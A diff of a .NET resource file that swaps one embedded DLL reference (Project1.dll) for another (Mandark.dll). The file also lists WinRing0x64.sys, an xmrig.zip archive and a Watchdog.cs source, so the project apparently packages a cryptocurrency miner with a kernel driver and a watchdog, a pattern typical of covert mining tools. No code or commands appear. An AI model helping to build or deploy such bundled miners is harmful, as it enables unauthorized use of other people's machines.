@@ -130,9 +130,6 @@
   <data name="WinRing0x64" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\WinRing0x64.sys;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
-  <data name="Project1" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\Project1.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
-  </data>
   <data name="xmrig" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\xmrig.zip;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
@@ -141,5 +138,8 @@
   </data>
   <data name="Watchdog" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Watchdog.cs;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
+  </data>
+  <data name="Mandark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Mandark.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
 </root>
